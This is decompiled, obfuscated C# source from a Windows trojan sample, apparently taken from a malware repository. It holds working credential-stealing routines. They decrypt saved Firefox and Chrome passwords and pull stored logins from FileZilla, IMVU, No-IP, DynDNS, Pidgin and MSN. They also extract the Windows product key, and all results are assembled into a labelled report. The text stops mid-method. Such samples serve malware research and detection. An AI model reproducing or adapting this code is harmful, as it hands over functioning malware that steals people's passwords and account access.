// Decompiled with JetBrains decompiler
// Type: QgC2uUC6fwwZxChSLm3NbGFF49
// Assembly: server 3.6, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 78702866-4FCA-4087-83C1-D481D36DCA54
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Foreign.neki-3dbeae94aa76d73d91612d22d1d82600e59b54ea77e5438c64464047f992a405.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ooM51FgENAIQr5W0;
using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using vcCUX55ezy8cZuH5;

public class QgC2uUC6fwwZxChSLm3NbGFF49
{
  private vWAa1m18 pxVBodbx9Cn181;
  private static IntPtr NSS3;
  public static string signon;
  private \u0035iTp0tCVoZP2X0Cdehy6 \u0037xPVmTE4aIw182;

  public QgC2uUC6fwwZxChSLm3NbGFF49()
  {
    this.pxVBodbx9Cn181 = new vWAa1m18();
    this.\u0037xPVmTE4aIw182 = new \u0035iTp0tCVoZP2X0Cdehy6();
  }

  public string erdirBwlKX0BnmhF6NVjNlFA217()
  {
    string str1 = "";
    string Left = (string) null;
    try
    {
      byte[] sourceArray = (byte[]) PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", false).GetValue("DigitalProductId");
      byte[] destinationArray = new byte[15];
      Array.Copy((Array) sourceArray, 52, (Array) destinationArray, 0, 15);
      string str2 = "BCDFGHJKMPQRTVWXY2346789";
      int num1 = 0;
      do
      {
        short startIndex = 0;
        int index = 14;
        do
        {
          short num2 = checked ((short) ((int) startIndex * 256 ^ (int) destinationArray[index]));
          destinationArray[index] = checked ((byte) Math.Round(Conversion.Int(unchecked ((double) num2 / 24.0))));
          startIndex = checked ((short) unchecked ((int) num2 % 24));
          checked { index += -1; }
        }
        while (index >= 0);
        str1 = str2.Substring((int) startIndex, 1) + str1;
        checked { ++num1; }
      }
      while (num1 <= 24);
      int num3 = 4;
      do
      {
        str1 = str1.Insert(checked (num3 * 5), "-");
        checked { num3 += -1; }
      }
      while (num3 >= 1);
      Left = Left + str1 + "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ Windows Key ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
  private static extern IntPtr aQEMen8aBWN2HjFEZaezCFup218(string dllFilePath);

  [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr \u0035nHnKlRTMC8219(IntPtr hModule, string procName);

  public static long AWK7nOQ0qze220(string configdir)
  {
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\mozcrt19.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nspr4.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plc4.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plds4.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\ssutil3.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\sqlite3.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nssutil3.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\softokn3.dll");
    QgC2uUC6fwwZxChSLm3NbGFF49.NSS3 = QgC2uUC6fwwZxChSLm3NbGFF49.aQEMen8aBWN2HjFEZaezCFup218(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nss3.dll");
    return ((QgC2uUC6fwwZxChSLm3NbGFF49.qi2Tel0M2G152) Marshal.GetDelegateForFunctionPointer(QgC2uUC6fwwZxChSLm3NbGFF49.\u0035nHnKlRTMC8219(QgC2uUC6fwwZxChSLm3NbGFF49.NSS3, "NSS_Init"), typeof (QgC2uUC6fwwZxChSLm3NbGFF49.qi2Tel0M2G152)))(configdir);
  }

  public static long YM8hkC75Yul221() => ((QgC2uUC6fwwZxChSLm3NbGFF49.SpnF35Alw4X53) Marshal.GetDelegateForFunctionPointer(QgC2uUC6fwwZxChSLm3NbGFF49.\u0035nHnKlRTMC8219(QgC2uUC6fwwZxChSLm3NbGFF49.NSS3, "PK11_GetInternalKeySlot"), typeof (QgC2uUC6fwwZxChSLm3NbGFF49.SpnF35Alw4X53)))();

  public static long eHRGLpf4Ug4222(long slot, bool loadCerts, long wincx) => ((QgC2uUC6fwwZxChSLm3NbGFF49.EIOx7ah683654) Marshal.GetDelegateForFunctionPointer(QgC2uUC6fwwZxChSLm3NbGFF49.\u0035nHnKlRTMC8219(QgC2uUC6fwwZxChSLm3NbGFF49.NSS3, "PK11_Authenticate"), typeof (QgC2uUC6fwwZxChSLm3NbGFF49.EIOx7ah683654)))(slot, loadCerts, wincx);

  public static int b4Hf3RKMF4Q223(
    IntPtr arenaOpt,
    IntPtr outItemOpt,
    StringBuilder inStr,
    int inLen)
  {
    return ((QgC2uUC6fwwZxChSLm3NbGFF49.m7DhemQCLmM55) Marshal.GetDelegateForFunctionPointer(QgC2uUC6fwwZxChSLm3NbGFF49.\u0035nHnKlRTMC8219(QgC2uUC6fwwZxChSLm3NbGFF49.NSS3, "NSSBase64_DecodeBuffer"), typeof (QgC2uUC6fwwZxChSLm3NbGFF49.m7DhemQCLmM55)))(arenaOpt, outItemOpt, inStr, inLen);
  }

  public static int QoVfs1fMGEE224(
    ref QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 data,
    ref QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 result,
    int cx)
  {
    return ((QgC2uUC6fwwZxChSLm3NbGFF49.M8YR3jSqjUG56) Marshal.GetDelegateForFunctionPointer(QgC2uUC6fwwZxChSLm3NbGFF49.\u0035nHnKlRTMC8219(QgC2uUC6fwwZxChSLm3NbGFF49.NSS3, "PK11SDR_Decrypt"), typeof (QgC2uUC6fwwZxChSLm3NbGFF49.M8YR3jSqjUG56)))(ref data, ref result, cx);
  }

  public string fI3fH3qKlEX225()
  {
    string Left = (string) null;
    try
    {
      bool flag = false;
      string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
      int index1 = 0;
      while (index1 < directories.Length)
      {
        string str = directories[index1];
        if (!flag)
        {
          string[] files = Directory.GetFiles(str);
          int index2 = 0;
          while (index2 < files.Length)
          {
            string input = files[index2];
            if (!flag)
            {
              if (Regex.IsMatch(input, "signons.sqlite"))
              {
                QgC2uUC6fwwZxChSLm3NbGFF49.AWK7nOQ0qze220(str);
                QgC2uUC6fwwZxChSLm3NbGFF49.signon = input;
              }
              checked { ++index2; }
            }
            else
              break;
          }
          checked { ++index1; }
        }
        else
          break;
      }
      string signon = QgC2uUC6fwwZxChSLm3NbGFF49.signon;
      QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 o1oeJnX1EqK51_1 = new QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51();
      QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 result1 = new QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51();
      QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 result2 = new QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51();
      DataTable dataTable = new GEZX9FCLgqe60(signon).P53nUizryuEqLJv262("SELECT * FROM moz_logins;");
      QgC2uUC6fwwZxChSLm3NbGFF49.eHRGLpf4Ug4222(QgC2uUC6fwwZxChSLm3NbGFF49.YM8hkC75Yul221(), true, 0L);
      try
      {
        foreach (DataRow row in dataTable.Rows)
        {
          string str = Convert.ToString(row["formSubmitURL"].ToString());
          Left = Left + "URL: " + str + "\r\n";
          StringBuilder inStr1 = new StringBuilder(row["encryptedUsername"].ToString());
          IntPtr num = new IntPtr(QgC2uUC6fwwZxChSLm3NbGFF49.b4Hf3RKMF4Q223(IntPtr.Zero, IntPtr.Zero, inStr1, inStr1.Length));
          object structure1 = Marshal.PtrToStructure(num, typeof (QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51));
          QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 o1oeJnX1EqK51_2;
          QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 data1 = structure1 != null ? (QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51) structure1 : o1oeJnX1EqK51_2;
          if (QgC2uUC6fwwZxChSLm3NbGFF49.QoVfs1fMGEE224(ref data1, ref result1, 0) == 0 && result1.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result1.SECItemLen - 1 + 1)];
            num = new IntPtr(result1.SECItemData);
            Marshal.Copy(num, numArray, 0, result1.SECItemLen);
            Left = Left + "USER: " + Encoding.ASCII.GetString(numArray) + "\r\n";
          }
          StringBuilder inStr2 = new StringBuilder(row["encryptedPassword"].ToString());
          num = new IntPtr(QgC2uUC6fwwZxChSLm3NbGFF49.b4Hf3RKMF4Q223(IntPtr.Zero, IntPtr.Zero, inStr2, inStr2.Length));
          object structure2 = Marshal.PtrToStructure(num, typeof (QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51));
          QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 data2 = structure2 != null ? (QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51) structure2 : o1oeJnX1EqK51_2;
          if (QgC2uUC6fwwZxChSLm3NbGFF49.QoVfs1fMGEE224(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result2.SECItemLen - 1 + 1)];
            num = new IntPtr(result2.SECItemData);
            Marshal.Copy(num, numArray, 0, result2.SECItemLen);
            Left = Left + "PASSWORD: " + Encoding.ASCII.GetString(numArray) + "\r\n";
          }
          Left += "\r\n";
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      Left += "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ FireFox 3.5+ ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string TA3z4yflcPg226()
  {
    string Left1 = (string) null;
    try
    {
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
      if (File.Exists(str1))
      {
        DataTable dataTable = new GEZX9FCLgqe60(str1).P53nUizryuEqLJv262("SELECT * FROM logins;");
        try
        {
          foreach (DataRow row in dataTable.Rows)
          {
            string str2 = Convert.ToString(row["origin_url"].ToString());
            string Left2 = Convert.ToString(row["username_value"].ToString());
            string Left3 = QgC2uUC6fwwZxChSLm3NbGFF49.xPZcN9GlUJb228((byte[]) row["password_value"]);
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left3, "", false) != 0)
            {
              string str3 = "Host: " + str2 + "\r\nUser: " + Left2 + "\r\nPassword: " + Left3 + "\r\n\r\n";
              Left1 += str3;
            }
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ Chrome ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool oQsLvWeP8Aq227(
    ref QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 pDataIn,
    string szDataDescr,
    ref QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 pOptionalEntropy,
    IntPtr pvReserved,
    ref QgC2uUC6fwwZxChSLm3NbGFF49.M2f1MQdvUjA58 pPromptStruct,
    int dwFlags,
    ref QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 pDataOut);

  public static string xPZcN9GlUJb228(byte[] Datas)
  {
    QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 svGyg6YeIkb59_1 = new QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59();
    QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 svGyg6YeIkb59_2 = new QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59();
    GCHandle gcHandle = GCHandle.Alloc((object) Datas, GCHandleType.Pinned);
    svGyg6YeIkb59_1.pbData = gcHandle.AddrOfPinnedObject();
    svGyg6YeIkb59_1.cbData = Datas.Length;
    gcHandle.Free();
    ref QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 local1 = ref svGyg6YeIkb59_1;
    QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 svGyg6YeIkb59_3;
    QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 svGyg6YeIkb59_4 = svGyg6YeIkb59_3;
    ref QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 local2 = ref svGyg6YeIkb59_4;
    IntPtr num;
    IntPtr pvReserved = num;
    QgC2uUC6fwwZxChSLm3NbGFF49.M2f1MQdvUjA58 m2f1MqdvUjA58_1;
    QgC2uUC6fwwZxChSLm3NbGFF49.M2f1MQdvUjA58 m2f1MqdvUjA58_2 = m2f1MqdvUjA58_1;
    ref QgC2uUC6fwwZxChSLm3NbGFF49.M2f1MQdvUjA58 local3 = ref m2f1MqdvUjA58_2;
    ref QgC2uUC6fwwZxChSLm3NbGFF49.SVGyg6YeIKb59 local4 = ref svGyg6YeIkb59_2;
    QgC2uUC6fwwZxChSLm3NbGFF49.oQsLvWeP8Aq227(ref local1, (string) null, ref local2, pvReserved, ref local3, 0, ref local4);
    byte[] numArray = new byte[checked (svGyg6YeIkb59_2.cbData + 1)];
    Marshal.Copy(svGyg6YeIkb59_2.pbData, numArray, 0, svGyg6YeIkb59_2.cbData);
    string str = Encoding.Default.GetString(numArray);
    return str.Substring(0, checked (str.Length - 1));
  }

  public string TvkcSXGwksP229()
  {
    string Left = (string) null;
    try
    {
      string[] strArray1 = PTvGBbzg8wJXkDlSAlonMk2.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml").Split('\r');
      int index1 = 0;
      while (index1 < strArray1.Length)
      {
        string str = strArray1[index1];
        if (str.Contains("<Host>"))
          Left = Left + "Host: " + str.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Port>"))
          Left = Left + ":" + str.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<User>"))
          Left = Left + "User: " + str.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Pass>"))
          Left = Left + "Pass: " + str.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
        checked { ++index1; }
      }
      Left += "\r\n";
      string[] strArray2 = PTvGBbzg8wJXkDlSAlonMk2.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml").Split('\r');
      int index2 = 0;
      while (index2 < strArray2.Length)
      {
        string str = strArray2[index2];
        if (str.Contains("<Host>"))
          Left = Left + "Host: " + str.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Port>"))
          Left = Left + ":" + str.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<User>"))
          Left = Left + "User: " + str.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
        if (str.Contains("<Pass>"))
          Left = Left + "Pass: " + str.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
        checked { ++index2; }
      }
      Left += "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ FileZilla ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string YjcNWytwvwm230()
  {
    string Left1 = (string) null;
    try
    {
      string Left2 = Conversions.ToString(PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "username", (object) null));
      string str = Conversions.ToString(PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "password", (object) null));
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str, "", false) != 0)
      {
        Left1 = Left1 + "\r\nUsername : " + Left2 + "\r\nPassword : " + this.t3dARK6EQUx231(str);
        Left1 += "\r\n";
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ IMVU ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  public string t3dARK6EQUx231(string Text)
  {
    string str;
    try
    {
      object Left = (object) null;
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, (object) Strings.Len(Text), (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object Right = (object) Strings.Mid(Text, Conversions.ToInteger(CounterResult), 2);
          Left = Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Left, (object) Strings.Chr(checked ((int) Math.Round(Conversion.Val(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) "&h", Right))))));
          CounterResult = Microsoft.VisualBasic.CompilerServices.Operators.AddObject(CounterResult, (object) 1);
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      str = Conversions.ToString(Left);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public string dWXqj3g8CfY232(string data)
  {
    string str;
    try
    {
      Decoder decoder = new UTF8Encoding().GetDecoder();
      byte[] bytes = Convert.FromBase64String(data);
      char[] chars = new char[checked (decoder.GetCharCount(bytes, 0, bytes.Length) - 1 + 1)];
      decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
      str = new string(chars);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public string IRGZ0d8RndE233()
  {
    string Left1 = (string) null;
    try
    {
      string Left2 = Conversions.ToString(PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object) null));
      string str1 = Conversions.ToString(PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object) null));
      string str2 = Conversions.ToString(PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object) null));
      string data = Conversions.ToString(PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object) null));
      string str3 = Conversions.ToString(PTvGBbzg8wJXkDlSAlonMk2.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object) null));
      string str4 = "\r\n";
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str1, "", false) != 0)
      {
        Left1 = Left1 + "Username: " + Left2 + str4 + "Password: " + this.dWXqj3g8CfY232(str1) + str4 + "Proxy Username:" + str2 + str4 + "Proxy Password: " + this.dWXqj3g8CfY232(data) + str4 + "Proxy Port: " + str3 + str4 + str4;
        Left1 += "\r\n";
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ No IP ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  public string w1gYi5WqFBU234()
  {
    string Left1 = (string) null;
    try
    {
      string Left2 = (string) null;
      string str1 = (string) null;
      string sDest = (string) null;
      string[] strArray = PTvGBbzg8wJXkDlSAlonMk2.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\DynDNS\\Updater\\config.dyndns").Split('\r');
      int index = 0;
      while (index < strArray.Length)
      {
        string str2 = strArray[index];
        if (str2.Contains("Username="))
          Left2 = Strings.Mid(str2, 11);
        else if (str2.Contains("Password="))
          str1 = Strings.Mid(str2, 11);
        checked { ++index; }
      }
      int num1 = Strings.Len(str1);
      int Start = 1;
      while (Start <= num1)
      {
        sDest += Conversions.ToString(Strings.Chr(checked ((int) Math.Round(Conversion.Val("&H" + Strings.Mid(str1, Start, 2))))));
        checked { Start += 2; }
      }
      int num2 = Strings.Len(sDest);
      int num3 = 1;
      while (num3 <= num2)
      {
        int num4;
        StringType.MidStmtStr(ref sDest, num3, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sDest, num3, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", checked (num4 + 1), 1)))));
        num4 = checked (num4 + 1) % 8;
        checked { ++num3; }
      }
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(sDest, "", false) != 0)
      {
        Left1 = Left1 + "User: " + Left2 + "\r\nPassword: " + sDest + "\r\n";
        Left1 += "\r\n";
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, (string) null, false) != 0)
      Left1 = "--------------------------------------------------------------------------------------\r\n[ DynDNS ]\r\n--------------------------------------------------------------------------------------\r\n" + Left1 + "\r\n";
    return Left1;
  }

  public string r5gQveqgmU7235()
  {
    string Left = (string) null;
    try
    {
      string file = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
      string str1 = Conversions.ToString(1);
      string str2 = "\r\n";
      string end = PTvGBbzg8wJXkDlSAlonMk2.Computer.FileSystem.OpenTextFileReader(file).ReadToEnd();
      string str3 = (string) null;
      string[] strArray1 = end.Split('\r');
      str1 = (string) null;
      string[] strArray2 = strArray1;
      int index = 0;
      while (index < strArray2.Length)
      {
        string str4 = strArray2[index];
        if (str4.Contains("<protocol>"))
          str3 = str3 + "Protocol:" + str4 + str2;
        if (str4.Contains("<name>"))
          str3 = str3 + "Name:" + str4 + str2;
        if (str4.Contains("<password>"))
          str3 = str3 + "Password:" + str4 + str2 + str2;
        checked { ++index; }
      }
      Left += str3;
      Left += "\r\n";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ Pidgin ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string ulmURKSwZxj236()
  {
    string Left = (string) null;
    try
    {
      try
      {
        foreach (N6tmaR17 n6tmaR17 in this.pxVBodbx9Cn181)
        {
          Left = Left + "Login: " + n6tmaR17.Login + "\r\n";
          Left = Left + "Password: " + n6tmaR17.Password + "\r\n\r\n";
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ MSN - Live Messenger ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string yqV9lLbcbAn237()
  {
    string Left = (string) null;
    try
    {
      bool flag = false;
      string str1 = Conversions.ToString(1);
      string file = (string) null;
      string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
      int index1 = 0;
      while (index1 < directories.Length)
      {
        string path = directories[index1];
        if (!flag)
        {
          string[] files = Directory.GetFiles(path);
          int index2 = 0;
          while (index2 < files.Length)
          {
            string input = files[index2];
            if (!flag)
            {
              if (Regex.IsMatch(input, "signons3.txt"))
                file = input;
              checked { ++index2; }
            }
            else
              break;
          }
          checked { ++index1; }
        }
        else
          break;
      }
      string[] strArray1 = PTvGBbzg8wJXkDlSAlonMk2.Computer.FileSystem.OpenTextFileReader(file).ReadToEnd().Split('\r');
      str1 = (string) null;
      QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 result = new QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51();
      string[] strArray2 = strArray1;
      int index3 = 0;
      while (index3 < strArray2.Length)
      {
        string str2 = strArray2[index3];
        if (str2.Length != 0 & str2.StartsWith(".") & !str2.StartsWith("#"))
          Left += "\r\n";
        else if (str2.StartsWith("http") | str2.Contains("//") | str2.Contains("ftp."))
          Left = Left + "URL: " + str2 + "\r\n";
        else if (str2.ToLower().Contains("username") | str2.ToLower().Contains("login") | str2.ToLower().Contains("email"))
          Left += "User: ";
        else if (str2.Contains("*"))
          Left += "Password: ";
        else if (str2.Contains("AAAAAAAAA"))
        {
          StringBuilder inStr = new StringBuilder(str2);
          IntPtr num = new IntPtr(QgC2uUC6fwwZxChSLm3NbGFF49.b4Hf3RKMF4Q223(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length));
          object structure = Marshal.PtrToStructure(num, typeof (QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51));
          QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 o1oeJnX1EqK51;
          QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 data = structure != null ? (QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51) structure : o1oeJnX1EqK51;
          if (QgC2uUC6fwwZxChSLm3NbGFF49.QoVfs1fMGEE224(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result.SECItemLen - 1 + 1)];
            num = new IntPtr(result.SECItemData);
            Marshal.Copy(num, numArray, 0, result.SECItemLen);
            Left = Left + Encoding.ASCII.GetString(numArray) + "\r\n";
          }
        }
        else if (str2.Contains("---"))
          Left += "\r\n";
        checked { ++index3; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ FireFox 2-3 ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public string NqAJ9HTr7QK238()
  {
    string Left = (string) null;
    try
    {
      try
      {
